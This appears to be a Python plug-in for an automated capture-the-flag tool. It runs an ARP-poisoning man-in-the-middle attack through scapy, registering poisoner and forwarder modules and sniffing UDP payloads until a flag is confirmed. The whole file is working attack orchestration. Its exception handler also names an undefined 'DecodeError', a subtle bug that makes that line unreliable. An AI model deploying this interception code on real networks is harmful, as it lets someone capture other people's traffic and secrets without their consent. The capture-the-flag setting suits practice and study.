import scapy.all as scapy
import capture
import strategy
import logging
import re

logger = logging.getLogger(__name__)

class ArpPoisonStrategy(strategy.Strategy):
    needsip = True
    challenge = 'example'

    class AnalysisModule(capture.Module):
        def __init__(self, flagpattern):
            self.flagpattern = flagpattern
            self.question = None
            self.flag = None
            self.sniffer = None

        def start(self, sniffer):
            self.sniffer = sniffer

        def process(self, pkt):
            if all(layer in pkt for layer in (scapy.Ether, scapy.IP, scapy.UDP, scapy.Raw)):
                logger.debug(pkt.sprintf('%IP.src%: %Raw.load%'))

                try:
                    load = pkt.load.decode('utf-8')
                except DecodeError:
                    return

                m = re.search(self.flagpattern, load)
                if m:
                    self.question = m.group(0)
                elif 'Yup' in load and self.question is not None:
                    self.flag = self.question
                    self.sniffer.stop()

    def execute(self, runner):
        sniffer = capture.Sniffer(iface=runner.iface)
        cachemod = capture.ArpCacheModule()
        analyser = self.AnalysisModule(runner.flagpattern)
        sniffer.register(
            cachemod,
            analyser,
            capture.ArpPoisonerModule(cachemod.cache),
            capture.ForwarderModule(cachemod.cache),
        )

        try:
            sniffer.start()
            sniffer.join()
        finally:
            sniffer.stop()
            sniffer.join()

        return analyser.flag
